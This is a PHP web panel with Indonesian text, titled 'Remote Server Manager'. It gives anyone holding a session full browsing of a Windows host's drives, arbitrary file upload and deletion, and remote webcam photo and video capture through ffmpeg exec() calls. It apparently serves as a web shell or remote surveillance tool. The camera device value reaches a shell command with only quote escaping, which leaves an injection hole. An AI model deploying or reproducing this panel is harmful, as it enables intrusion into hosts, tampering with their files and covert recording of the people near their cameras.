<?php
session_start();

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header('Location: dump.php');
    exit;
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: dump.php');
    exit;
}

$message = '';
$messageType = '';
$currentDir = $_GET['dir'] ?? 'C:';
$mode = $_GET['mode'] ?? 'files';

$currentDir = str_replace(['../', '..\\'], '', $currentDir);
if (!is_dir($currentDir)) {
    $currentDir = 'C:';
}

$devices = [];
$capturedImage = null;
$capturedVideo = null;
$logOutput = "";

if ($mode === 'camera') {
    $output = [];
    exec("ffmpeg.exe -list_devices true -f dshow -i dummy 2>&1", $output);
    
    foreach ($output as $line) {
        if (preg_match('/"(.+?)"\s+\(video\)/', $line, $matches)) {
            $devices[] = $matches[1];
        }
    }

    $selectedDevice = $_POST['device'] ?? null;
    $captureType = $_POST['capture_type'] ?? 'image';

    if ($selectedDevice && isset($_POST['capture'])) {
        $ffmpegPath = __DIR__ . DIRECTORY_SEPARATOR . "ffmpeg.exe";
        $escapedDevice = str_replace('"', '\"', $selectedDevice);

        if ($captureType === 'image') {
            $filename = "snapshot_" . date('Y-m-d_H-i-s') . ".jpg";
            $cmd = "\"$ffmpegPath\" -f dshow -i video=\"$escapedDevice\" -frames:v 1 \"$filename\" -y";
        } else {
            $duration = (int)($_POST['duration'] ?? 10);
            $filename = "video_" . date('Y-m-d_H-i-s') . ".mp4";
            $cmd = "\"$ffmpegPath\" -f dshow -i video=\"$escapedDevice\" -t $duration \"$filename\" -y";
        }

        exec($cmd . " 2>&1", $cap_output, $status);
        $logOutput = implode("\n", $cap_output);

        if ($status === 0 && file_exists($filename)) {
            if ($captureType === 'image') {
                $capturedImage = $filename;
                $message = "Gambar berhasil ditangkap: $filename";
            } else {
                $capturedVideo = $filename;
                $message = "Video berhasil direkam: $filename";
            }
            $messageType = 'success';
        } else {
            $message = "Gagal menangkap " . ($captureType === 'image' ? 'gambar' : 'video');
            $messageType = 'error';
        }
    }
}

if ($mode === 'files' || $mode === 'upload') {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
        $file = $_FILES['file'];
        
        if ($file['error'] === UPLOAD_ERR_OK) {
            $fileName = $file['name'];
            $fileSize = $file['size'];
            $fileTmp = $file['tmp_name'];

            $fileName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $fileName);
            
            $destination = $currentDir . DIRECTORY_SEPARATOR . $fileName;
            
            if ($fileSize > 100 * 1024 * 1024) {
                $message = 'File terlalu besar! Maksimal 100MB.';
                $messageType = 'error';
            } else {
                if (move_uploaded_file($fileTmp, $destination)) {
                    $message = "File '{$fileName}' berhasil diupload ke '{$currentDir}' sebagai '{$newFileName}'";
                    $messageType = 'success';
                } else {
                    $message = 'Gagal mengupload file!';
                    $messageType = 'error';
                }
            }
        } else {
            $message = 'Error upload: ' . $file['error'];
            $messageType = 'error';
        }
    }

    if (isset($_GET['delete'])) {
        $fileToDelete = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['delete']);
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (rmdir($fileToDelete)) {
                    $message = 'Folder berhasil dihapus!';
                    $messageType = 'success';
                } else {
                    $message = 'Gagal menghapus folder! (pastikan folder kosong)';
                    $messageType = 'error';
                }
            } else {
                if (unlink($fileToDelete)) {
                    $message = 'File berhasil dihapus!';
                    $messageType = 'success';
                } else {
                    $message = 'Gagal menghapus file!';
                    $messageType = 'error';
                }
            }
        }
    }

    if (isset($_POST['create_folder'])) {
        $folderName = trim($_POST['folder_name']);
        if (!empty($folderName)) {
            $folderName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $folderName);
            $newFolderPath = $currentDir . DIRECTORY_SEPARATOR . $folderName;
            
            if (!file_exists($newFolderPath)) {
                if (mkdir($newFolderPath, 0755)) {
                    $message = "Folder '$folderName' berhasil dibuat!";
                    $messageType = 'success';
                } else {
                    $message = 'Gagal membuat folder!';
                    $messageType = 'error';
                }
            } else {
                $message = 'Folder sudah ada!';
                $messageType = 'error';
            }
        }
    }
}

function getDirectoryContents($dir) {
    $items = [];
    
    if (is_dir($dir)) {
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                $filePath = $dir . DIRECTORY_SEPARATOR . $file;
                
                if (is_readable($filePath)) {
                    $items[] = [
                        'name' => $file,
                        'path' => $filePath,
                        'is_dir' => is_dir($filePath),
                        'size' => is_file($filePath) ? filesize($filePath) : 0,
                        'date' => date('Y-m-d H:i:s', filemtime($filePath)),
                        'type' => is_file($filePath) ? (function_exists('mime_content_type') ? mime_content_type($filePath) : 'unknown') : 'directory'
                    ];
                }
            }
        }
    }
    
    usort($items, function($a, $b) {
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    
    return $items;
}

function formatFileSize($bytes) {
    if ($bytes == 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

function getFileIcon($type, $isDir = false) {
    if ($isDir) return '📁';
    if (strpos($type, 'image') !== false) return '🖼️';
    if (strpos($type, 'video') !== false) return '🎥';
    if (strpos($type, 'audio') !== false) return '🎵';
    if (strpos($type, 'pdf') !== false) return '📄';
    if (strpos($type, 'text') !== false) return '📝';
    if (strpos($type, 'zip') !== false || strpos($type, 'rar') !== false) return '📦';
    if (strpos($type, 'application') !== false) return '⚙️';
    return '📄';
}

function getDrives() {
    $drives = [];
    for ($letter = 'A'; $letter <= 'Z'; $letter++) {
        $drive = $letter . ':';
        if (is_dir($drive)) {
            $drives[] = $drive;
        }
    }
    return $drives;
}

$drives = getDrives();
$directoryContents = ($mode === 'files' || $mode === 'upload') ? getDirectoryContents($currentDir) : [];
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Server Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }

        .header {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            color: white;
            padding: 15px 0;
            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
        }

        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 24px;
            font-weight: 600;
        }

        .nav-tabs {
            display: flex;
            gap: 10px;
        }

        .nav-tab {
            background: rgba(255,255,255,0.2);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            text-decoration: none;
            font-size: 14px;
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .nav-tab:hover, .nav-tab.active {
            background: rgba(255,255,255,0.3);
            transform: translateY(-2px);
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logout-btn {
            background: rgba(255,30,30,0.3);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 20px;
            text-decoration: none;
            font-size: 14px;
            transition: background-color 0.3s ease;
        }

        .logout-btn:hover {
            background: rgba(255,30,30,0.5);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .content-section {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            overflow: hidden;
            margin-bottom: 20px;
        }

        .message {
            padding: 15px 30px;
            border-bottom: 1px solid #e9ecef;
            font-weight: 500;
        }

        .message.success {
            background-color: #d4edda;
            color: #155724;
        }

        .message.error {
            background-color: #f8d7da;
            color: #721c24;
        }

        .breadcrumb {
            padding: 20px 30px;
            background-color: #f8f9fa;
            border-bottom: 1px solid #e9ecef;
            display: flex;
            align-items: center;
            gap: 15px;
            flex-wrap: wrap;
        }

        .drives {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .drive-btn {
            background: #007bff;
            color: white;
            border: none;
            padding: 5px 12px;
            border-radius: 15px;
            text-decoration: none;
            font-size: 12px;
            transition: all 0.3s ease;
        }

        .drive-btn:hover, .drive-btn.active {
            background: #0056b3;
            transform: scale(1.05);
        }

        .path-display {
            font-family: monospace;
            background: #e9ecef;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            word-break: break-all;
        }

        .toolbar {
            padding: 20px 30px;
            background-color: #f8f9fa;
            border-bottom: 1px solid #e9ecef;
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }

        .folder-form {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .folder-form input {
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
        }

        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-success {
            background: #28a745;
            color: white;
        }

        .btn-danger {
            background: #dc3545;
            color: white;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .files-list {
            max-height: 600px;
            overflow-y: auto;
        }

        .file-item {
            display: flex;
            align-items: center;
            padding: 15px 30px;
            border-bottom: 1px solid #f0f0f0;
            transition: background-color 0.2s ease;
        }

        .file-item:hover {
            background-color: #f8f9fa;
        }

        .file-icon {
            font-size: 24px;
            margin-right: 15px;
            width: 40px;
            text-align: center;
        }

        .file-info {
            flex: 1;
        }

        .file-name {
            font-weight: 500;
            color: #333;
            margin-bottom: 5px;
            word-break: break-all;
            cursor: pointer;
        }

        .file-name:hover {
            color: #007bff;
        }

        .file-meta {
            font-size: 12px;
            color: #666;
        }

        .file-actions {
            display: flex;
            gap: 8px;
        }

        .upload-area {
            border: 3px dashed #d1d5db;
            border-radius: 12px;
            padding: 40px 20px;
            text-align: center;
            transition: all 0.3s ease;
            cursor: pointer;
            margin: 30px;
        }

        .upload-area:hover, .upload-area.dragover {
            border-color: #667eea;
            background-color: #f8f9ff;
            transform: scale(1.02);
        }

        .upload-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .file-input {
            display: none;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background-color: #e9ecef;
            border-radius: 4px;
            margin-top: 15px;
            overflow: hidden;
            display: none;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            width: 0%;
            transition: width 0.3s ease;
        }

        .camera-section {
            padding: 30px;
        }

        .camera-controls {
            display: flex;
            gap: 15px;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .camera-controls select, .camera-controls input {
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
        }

        .capture-result {
            text-align: center;
            margin-top: 20px;
        }

        .capture-result img, .capture-result video {
            max-width: 100%;
            border-radius: 12px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .log-output {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            font-family: monospace;
            font-size: 12px;
            white-space: pre-wrap;
            max-height: 200px;
            overflow-y: auto;
        }

        .no-content {
            text-align: center;
            padding: 50px 20px;
            color: #666;
        }

        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 15px;
            }

            .nav-tabs {
                order: -1;
            }

            .container {
                padding: 15px;
            }

            .breadcrumb, .toolbar {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }

            .file-item {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }

            .file-actions {
                width: 100%;
                justify-content: flex-end;
            }

            .camera-controls {
                flex-direction: column;
                align-items: stretch;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <h1>🖥️ Server Absen Manager</h1>
            <div class="nav-tabs">
                <a href="?mode=files&dir=<?= urlencode($currentDir) ?>" class="nav-tab <?= $mode === 'files' ? 'active' : '' ?>">
                    📁 Files
                </a>
                <a href="?mode=upload&dir=<?= urlencode($currentDir) ?>" class="nav-tab <?= $mode === 'upload' ? 'active' : '' ?>">
                    📤 Upload
                </a>
                <a href="?mode=camera" class="nav-tab <?= $mode === 'camera' ? 'active' : '' ?>">
                    📷 Camera
                </a>
            </div>
            <div class="user-info">
                <span>👨‍💼 <?= htmlspecialchars($_SESSION['username']) ?></span>
                <a href="?logout=1" class="logout-btn" onclick="return confirm('Yakin ingin logout?')">
                    🚪 Logout
                </a>
            </div>
        </div>
    </div>

    <div class="container">
        <?php if ($message): ?>
            <div class="content-section">
                <div class="message <?= $messageType ?>">
                    <?= $messageType === 'success' ? '✅' : '❌' ?> <?= htmlspecialchars($message) ?>
                </div>
            </div>
        <?php endif; ?>

        <?php if ($mode === 'files' || $mode === 'upload'): ?>
            <div class="content-section">
                <div class="breadcrumb">
                    <div>
                        <strong>💿 Drives:</strong>
                        <div class="drives">
                            <?php foreach ($drives as $drive): ?>
                                <a href="?mode=<?= $mode ?>&dir=<?= urlencode($drive) ?>" 
                                   class="drive-btn <?= (strpos($currentDir, $drive) === 0) ? 'active' : '' ?>">
                                    <?= $drive ?>
                                </a>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    <div>
                        <strong>📂 Current Path:</strong>
                        <div class="path-display"><?= htmlspecialchars($currentDir) ?></div>
                    </div>
                </div>

                <?php if ($mode === 'upload'): ?>
                    <form method="POST" enctype="multipart/form-data" id="uploadForm">
                        <div class="upload-area" id="uploadArea">
                            <div class="upload-icon">📤</div>
                            <div class="upload-text">
                                <strong>Klik untuk memilih file atau seret file ke sini</strong>
                                <br><small>Upload ke: <?= htmlspecialchars($currentDir) ?></small>
                                <br><small>Maksimal ukuran file: 100MB</small>
                            </div>
                            <input type="file" name="file" id="fileInput" class="file-input" required>
                            <button type="button" class="btn btn-primary" onclick="document.getElementById('fileInput').click()">
                                📁 Pilih File
                            </button>
                            <div class="progress-bar" id="progressBar">
                                <div class="progress-fill" id="progressFill"></div>
                            </div>
                        </div>
                    </form>
                <?php endif; ?>

                <div class="toolbar">
                    <form method="POST" class="folder-form">
                        <input type="text" name="folder_name" placeholder="Nama folder baru" required>
                        <button type="submit" name="create_folder" class="btn btn-success">
                            📁 Buat Folder
                        </button>
                    </form>
                    
                    <?php if (dirname($currentDir) !== $currentDir): ?>
                        <a href="?mode=<?= $mode ?>&dir=<?= urlencode(dirname($currentDir)) ?>" class="btn btn-primary">
                            ⬆️ Parent Directory
                        </a>
                    <?php endif; ?>
                    
                    <span style="margin-left: auto; color: #666;">
                        📋 Total: <?= count($directoryContents) ?> items
                    </span>
                </div>

                <?php if (empty($directoryContents)): ?>
                    <div class="no-content">
                        <div style="font-size: 48px; margin-bottom: 15px;">📁</div>
                        <p>Folder kosong atau tidak dapat diakses</p>
                    </div>
                <?php else: ?>
                    <div class="files-list">
                        <?php foreach ($directoryContents as $item): ?>
                            <div class="file-item">
                                <div class="file-icon">
                                    <?= getFileIcon($item['type'], $item['is_dir']) ?>
                                </div>
                                <div class="file-info">
                                    <?php if ($item['is_dir']): ?>
                                        <div class="file-name">
                                            <a href="?mode=<?= $mode ?>&dir=<?= urlencode($item['path']) ?>" style="text-decoration: none; color: inherit;">
                                                <?= htmlspecialchars($item['name']) ?>
                                            </a>
                                        </div>
                                    <?php else: ?>
                                        <div class="file-name"><?= htmlspecialchars($item['name']) ?></div>
                                    <?php endif; ?>
                                    <div class="file-meta">
                                        <?php if (!$item['is_dir']): ?>
                                            📊 <?= formatFileSize($item['size']) ?> • 
                                        <?php endif; ?>
                                        📅 <?= $item['date'] ?> • 
                                        🏷️ <?= $item['is_dir'] ? 'Directory' : htmlspecialchars($item['type']) ?>
                                    </div>
                                </div>
                                <div class="file-actions">
                                    <?php if (!$item['is_dir']): ?>
                                        <?php 
                                        $isMedia = strpos($item['type'], 'image') !== false || 
                                                  strpos($item['type'], 'video') !== false || 
                                                  strpos($item['type'], 'audio') !== false ||
                                                  strpos($item['type'], 'text') !== false;
                                        ?>
                                        <?php if ($isMedia): ?>
                                            <a href="viewer.php?file=<?= urlencode($item['path']) ?>" 
                                               class="btn btn-primary" 
                                               target="_blank"
                                               style="font-size: 12px; padding: 4px 8px;">
                                                👁️ View
                                            </a>
                                        <?php endif; ?>
                                        <a href="download.php?file=<?= urlencode($item['path']) ?>" 
                                           class="btn btn-success" 
                                           style="font-size: 12px; padding: 4px 8px;">
                                            ⬇️ Download
                                        </a>
                                    <?php endif; ?>
                                    <a href="?mode=<?= $mode ?>&dir=<?= urlencode($currentDir) ?>&delete=<?= urlencode($item['name']) ?>" 
                                       class="btn btn-danger"
                                       style="font-size: 12px; padding: 4px 8px;"
                                       onclick="return confirm('Yakin ingin menghapus <?= $item['is_dir'] ? 'folder' : 'file' ?> ini?')">
                                        🗑️ Hapus
                                    </a>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>

        <?php elseif ($mode === 'camera'): ?>
            <div class="content-section">
                <div class="camera-section">
                    <h2>📷 Webcam Capture</h2>
                    
                    <form method="POST">
                        <div class="camera-controls">
                            <select name="device" required>
                                <option value="">-- Pilih Kamera --</option>
                                <?php foreach ($devices as $device): ?>
                                    <option value="<?= htmlspecialchars($device) ?>" <?= ($device === ($selectedDevice ?? '')) ? 'selected' : '' ?>>
                                        <?= htmlspecialchars($device) ?>
                                    </option>
                                <?php endforeach; ?>
                            </select>
                            
                            <select name="capture_type">
                                <option value="image" <?= (($_POST['capture_type'] ?? 'image') === 'image') ? 'selected' : '' ?>>📸 Ambil Foto</option>
                                <option value="video" <?= (($_POST['capture_type'] ?? '') === 'video') ? 'selected' : '' ?>>🎥 Rekam Video</option>
                            </select>
                            
                            <input type="number" name="duration" value="<?= $_POST['duration'] ?? 10 ?>" min="1" max="300" placeholder="Durasi (detik)" id="durationInput" style="display: <?= (($_POST['capture_type'] ?? 'image') === 'video') ? 'block' : 'none' ?>;">
                            
                            <button type="submit" name="capture" class="btn btn-primary">
                                🎯 Capture
                            </button>
                        </div>
                    </form>

                    <?php if ($capturedImage): ?>
                        <div class="capture-result">
                            <h3>✅ Foto Berhasil Ditangkap:</h3>
                            <img src="<?= $capturedImage ?>?t=<?= time() ?>" alt="Captured Image" />
                            <br><br>
                            <a href="<?= $capturedImage ?>" download class="btn btn-success">⬇️ Download Foto</a>
                        </div>
                    <?php elseif ($capturedVideo): ?>
                        <div class="capture-result">
                            <h3>✅ Video Berhasil Direkam:</h3>
                            <video controls>
                                <source src="<?= $capturedVideo ?>?t=<?= time() ?>" type="video/mp4">
                                Browser Anda tidak mendukung video tag.
                            </video>
                            <br><br>
                            <a href="<?= $capturedVideo ?>" download class="btn btn-success">⬇️ Download Video</a>
                        </div>
                    <?php elseif ($selectedDevice ?? false): ?>
                        <div class="capture-result">
                            <h3 style="color:red;">❌ Gagal menangkap gambar/video!</h3>
                        </div>
                    <?php endif; ?>

                    <?php if ($logOutput && ($selectedDevice ?? false)): ?>
                        <div class="log-output">
                            <strong>📋 FFmpeg Log:</strong><br>
                            <?= htmlspecialchars($logOutput) ?>
                        </div>
                    <?php endif; ?>

                    <?php if (empty($devices)): ?>
                        <div class="no-content">
                            <div style="font-size: 48px; margin-bottom: 15px;">📷</div>
                            <p>Tidak ada kamera yang terdeteksi atau FFmpeg tidak ditemukan</p>
                            <small>Pastikan ffmpeg.exe ada di folder yang sama dengan script ini</small>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script>
        <?php if ($mode === 'upload'): ?>
        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const uploadForm = document.getElementById('uploadForm');
        const progressBar = document.getElementById('progressBar');
        const progressFill = document.getElementById('progressFill');

        if (uploadArea && fileInput) {
            uploadArea.addEventListener('dragover', (e) => {
                e.preventDefault();
                uploadArea.classList.add('dragover');
            });

            uploadArea.addEventListener('dragleave', () => {
                uploadArea.classList.remove('dragover');
            });

            uploadArea.addEventListener('drop', (e) => {
                e.preventDefault();
                uploadArea.classList.remove('dragover');
                
                const files = e.dataTransfer.files;
                if (files.length > 0) {
                    fileInput.files = files;
                    uploadFile();
                }
            });

            fileInput.addEventListener('change', () => {
                if (fileInput.files.length > 0) {
                    uploadFile();
                }
            });

            function uploadFile() {
                const file = fileInput.files[0];
                if (!file) return;

                const formData = new FormData();
                formData.append('file', file);

                progressBar.style.display = 'block';
                progressFill.style.width = '0%';

                const xhr = new XMLHttpRequest();

                xhr.upload.addEventListener('progress', (e) => {
                    if (e.lengthComputable) {
                        const percentComplete = (e.loaded / e.total) * 100;
                        progressFill.style.width = percentComplete + '%';
                    }
                });

                xhr.addEventListener('load', () => {
                    if (xhr.status === 200) {
                        window.location.reload();
                    } else {
                        alert('Upload gagal!');
                        progressBar.style.display = 'none';
                    }
                });

                xhr.addEventListener('error', () => {
                    alert('Terjadi kesalahan saat upload!');
                    progressBar.style.display = 'none';
                });

                xhr.open('POST', '');
                xhr.send(formData);
            }
        }
        <?php endif; ?>

        <?php if ($mode === 'camera'): ?>
        const captureTypeSelect = document.querySelector('select[name="capture_type"]');
        const durationInput = document.getElementById('durationInput');

        if (captureTypeSelect && durationInput) {
            captureTypeSelect.addEventListener('change', function() {
                if (this.value === 'video') {
                    durationInput.style.display = 'block';
                } else {
                    durationInput.style.display = 'none';
                }
            });
        }
        <?php endif; ?>

        function refreshPage() {
            const urlParams = new URLSearchParams(window.location.search);
            window.location.href = window.location.pathname + '?' + urlParams.toString();
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
                e.preventDefault();
                refreshPage();
            }

            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                const currentDir = new URLSearchParams(window.location.search).get('dir') || 'C:';
                window.location.href = '?mode=upload&dir=' + encodeURIComponent(currentDir);
            }

            if (e.ctrlKey && e.key === 'f') {
                e.preventDefault();
                const currentDir = new URLSearchParams(window.location.search).get('dir') || 'C:';
                window.location.href = '?mode=files&dir=' + encodeURIComponent(currentDir);
            }

            if (e.ctrlKey && e.key === 'c') {
                e.preventDefault();
                window.location.href = '?mode=camera';
            }
        });

        document.addEventListener('DOMContentLoaded', function() {
            const shortcuts = document.createElement('div');
            shortcuts.innerHTML = `
                <div style="position: fixed; bottom: 10px; right: 10px; background: rgba(0,0,0,0.8); color: white; padding: 10px; border-radius: 8px; font-size: 12px; z-index: 1000; display: none;" id="shortcuts">
                    <strong>⌨️ Keyboard Shortcuts:</strong><br>
                    F5 / Ctrl+R: Refresh<br>
                    Ctrl+F: Files Mode<br>
                    Ctrl+U: Upload Mode<br>
                    Ctrl+C: Camera Mode
                </div>
            `;
            document.body.appendChild(shortcuts);

            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && e.key === '?') {
                    e.preventDefault();
                    const shortcutsDiv = document.getElementById('shortcuts');
                    shortcutsDiv.style.display = shortcutsDiv.style.display === 'none' ? 'block' : 'none';
                }
            });
        });

        const messages = document.querySelectorAll('.message');
        messages.forEach(message => {
            setTimeout(() => {
                message.style.opacity = '0';
                message.style.transition = 'opacity 0.5s ease';
                setTimeout(() => {
                    message.style.display = 'none';
                }, 500);
            }, 5000);
        });

        document.querySelectorAll('a[href*="delete="], form').forEach(element => {
            element.addEventListener('click', function(e) {
                if (this.tagName === 'A' && this.href.includes('delete=')) {
                    if (confirm('Yakin ingin menghapus item ini?')) {
                        showLoading();
                    } else {
                        e.preventDefault();
                    }
                } else if (this.tagName === 'FORM') {
                    showLoading();
                }
            });
        });

        function showLoading() {
            const loading = document.createElement('div');
            loading.innerHTML = `
                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; justify-content: center; align-items: center; z-index: 9999;">
                    <div style="background: white; padding: 30px; border-radius: 15px; text-align: center;">
                        <div style="font-size: 48px; margin-bottom: 15px;">⏳</div>
                        <div style="font-size: 18px; font-weight: bold;">Processing...</div>
                        <div style="font-size: 14px; color: #666; margin-top: 5px;">Please wait</div>
                    </div>
                </div>
            `;
            document.body.appendChild(loading);
        }

        <?php if ($mode === 'upload'): ?>
        if (fileInput) {
            fileInput.addEventListener('change', function() {
                const file = this.files[0];
                if (file && file.size > 100 * 1024 * 1024) {
                    alert('File terlalu besar! Maksimal 100MB.');
                    this.value = '';
                    return false;
                }
            });
        }
        <?php endif; ?>
    </script>
</body>
</html>
